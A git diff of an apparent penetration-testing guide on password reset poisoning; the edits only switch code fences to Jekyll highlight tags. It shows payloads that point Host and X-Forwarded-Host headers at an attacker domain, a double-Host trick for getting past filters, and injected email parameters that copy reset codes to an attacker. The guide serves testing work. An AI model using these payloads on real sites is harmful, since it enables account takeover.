@@ -30,27 +30,27 @@ The following headers can be modified in an attempt to modify the password reset
 
 Replace the Host: header with a server you control.
 
-```
+{% highlight bash %} 
 Host: attackers-domain.com
-```
+{% endhighlight %}
 
 ##### Double Host Header
 
 Often when you modify the Host header the application, or WAF fails to the process the request, a technique which can potentially bypass this filter if to simply add a second Host header to the request. 
 
-```
+{% highlight bash %}
 Host: target.com
 Host: attackers-domain.com
-```
+{% endhighlight %}
 
 ##### X-Forwarded-Host Header
 
 Add an attacker controlled domain in the X-forwarded-Host header directive.
 
-```
+{% highlight bash %}
 Host: target.com 
 X-Forwarded-Host: attackers-domain.com
-``` 
+{% endhighlight %} 
 
 
 #### Confirm Vulnerable 
@@ -89,19 +89,19 @@ Vulnerable applications can be manipulated to send password reset codes to multi
 
 1. Interecept the request, and add a second email address to the request
 
-```
+{% highlight bash %}
 &
 %20
 |
 %0a%0dcc:
 %0a%0dbcc:
-```
+{% endhighlight %}
  
 Modify the parameter matching the applications format, example:
 
-```
+{% highlight bash %} 
 email="victim@mail.tld",email="attacker@mail.tld"
-```
+{% endhighlight %}
 
 <div class="note tip">
   <h5>Match the API Request Schema</h5>
